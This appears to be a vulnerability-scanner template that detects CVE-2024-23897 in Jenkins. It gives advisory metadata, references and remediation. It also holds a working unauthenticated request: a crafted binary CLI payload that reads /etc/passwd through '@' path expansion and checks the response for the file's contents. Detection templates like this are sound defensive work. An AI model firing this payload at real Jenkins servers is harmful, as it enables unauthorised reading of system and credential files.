id: CVE-2024-23897
info:
  name: Jenkins Command Line Interface (CLI) Path Traversal Vulnerability
  author: n3integration
  tags: cve,cve2024,kev,vuln
  description: |
    Jenkins 2.441 and earlier, LTS 2.426.2 and earlier does not disable a feature of its CLI command parser that replaces 
    an '@' character followed by a file path in an argument with the file's contents, allowing unauthenticated attackers 
    to read arbitrary files on the Jenkins controller file system.
  reference:
    - https://www.openwall.com/lists/oss-security/2024/01/24/6
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-23897
    - https://www.cve.org/CVERecord?id=CVE-2024-23897
    - https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314
    - https://docs.cloudbees.com/docs/cloudbees-ci-kb/latest/client-and-managed-controllers/disable-jenkins-cli#_resolution
    - https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/
    - https://www.vicarius.io/vsociety/posts/the-anatomy-of-a-jenkins-vulnerability-cve-2024-23897-revealed-1
  severity: critical
  metadata:
    runzero-match: service["product"] contains "Jenkins"
  classification:
    cve-id: CVE-2024-23897
    cwe-id: CWE-27
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-score: 0.94466
    epss-percentile: 0.99992
    cpe: cpe:2.3:a:jenkins:jenkins:*:*:*:*:*:*:*:*,cpe:2.3:a:jenkins:jenkins:*:*:*:*:lts:*:*:*
  remediation: |
    Upgrade affected versions of Jenkins to the latest patched version. If unable to upgrade the affected system, 
    disabling CLI access can be implemented as a workaround.
variables:
  session: '{{ join("-", "6b711869-2dbd-4a99-b4d1", rand_base(12, "0123456789abcdef")) }}'
  path: /etc/passwd
requests:
  - path:
      - '{{BaseURL}}/cli?remoting=false'
    method: POST
    headers:
      Session: "{{session}}"
      Side: "{{side}}"
      Accept-Encoding: identity
      Content-Type: "application/octet-stream"
    body: "{{content}}{{delay}}"
    attack: pitchfork
    payloads:
      side:
        - download
        - upload
      content:
        - ""
        - "\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@{{path}}\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03"
      delay:
        - ""
        - "{{wait_for(1)}}"
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'regex("\\w+:.*:\\d{1,4}:\\d{1,4}:", body)'
        condition: and
